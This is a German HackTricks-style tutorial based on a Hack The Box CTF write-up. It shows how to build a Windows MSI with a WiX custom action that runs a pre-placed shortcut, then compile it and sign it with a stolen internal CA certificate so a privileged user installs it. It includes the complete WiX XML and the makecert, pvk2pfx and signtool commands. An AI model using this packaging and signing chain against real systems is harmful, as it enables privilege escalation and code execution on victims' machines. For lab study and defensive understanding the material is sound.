# Erstellen eines MSI mit Custom-Action unter Verwendung von WiX

{{#include ../../banners/hacktricks-training.md}}

Diese historische Hack The Box chain verwendete WiX Toolset v3, um ein MSI zu erstellen, das eine zuvor platzierte `.lnk`-Datei startete. **Ein MSI verfügt nicht automatisch über erhöhte Rechte**: Die Ausführung erfolgt im Kontext, der durch die Windows-Installer-Richtlinie, die Attribute der Custom-Action und die Person ausgewählt wird, die es installiert. Im zitierten Szenario stahl der Angreifer außerdem eine vertrauenswürdige Signing-CA und platzierte das signierte MSI in einem Ordner, der von einem anderen Benutzer überwacht wurde.<sup>[[1]](#references)[[3]](#references)</sup>

Für ein umfassendes Verständnis von Beispielen zur Verwendung von wix MSI empfiehlt es sich, [diese Seite](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) zu konsultieren. Hier finden sich verschiedene Beispiele, die die Verwendung von wix MSI demonstrieren.<sup>[[2]](#references)</sup>

Das MSI führt `C:\Users\Public\Desktop\Shortcuts\rick.lnk` aus. Das ursprüngliche WiX-v3-XML ist unten unverändert enthalten:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` legt die minimale Windows-Installer-Version fest, und `Compressed="yes"` kennzeichnet das Paket als komprimiert. `Stage1` ist zurückgestellt, verfügt jedoch über `Impersonate="yes"` und wird daher mit dem impersonierten Token des installierenden Benutzers ausgeführt; die Änderung der Berechtigungen in diesem Szenario erfolgte durch den privilegierten Benutzer, der die MSI später öffnete, und nicht dadurch, dass dieses Attribut auf magische Weise SYSTEM-Berechtigungen gewährt.<sup>[[3]](#references)</sup>

Kompiliere den Quelltext mit `candle.exe` zu einem WiX-Objekt:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Verknüpfe dieses Objekt mit `light.exe` zu einem MSI:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Im ursprünglichen Ablauf verwendeter Signierschritt

Der Ziel-Workflow akzeptierte Pakete, die von einer kompromittierten internen CA signiert wurden. In der Dokumentation wurde aus der wiederhergestellten `MyCA.cer`/`MyCA.pvk` ein Signaturzertifikat abgeleitet, eine PFX erstellt und die MSI signiert:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Der Angreifer platzierte das signierte Paket anschließend in `D:\DEV\MSIs` und wartete darauf, dass der privilegierte Workflow/Benutzer es ausführte. Bewahre diese Voraussetzung bei der Anpassung der Technik: Ohne einen Installationspfad mit erhöhten Rechten, eine unsichere Richtlinie wie `AlwaysInstallElevated` oder ein privilegiertes Opfer wird dieses Paket nur mit den Rechten des aktuellen Benutzers ausgeführt.

## References

- [1] [Hack The Box - Ethereal: Bösartige msi erstellen und root erhalten - 0xRicks Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Eine kurze Einführung: Einen MSI-Installer mit WiX erstellen - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Benutzerdefinierte Aktionen mit verzögerter Ausführung (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
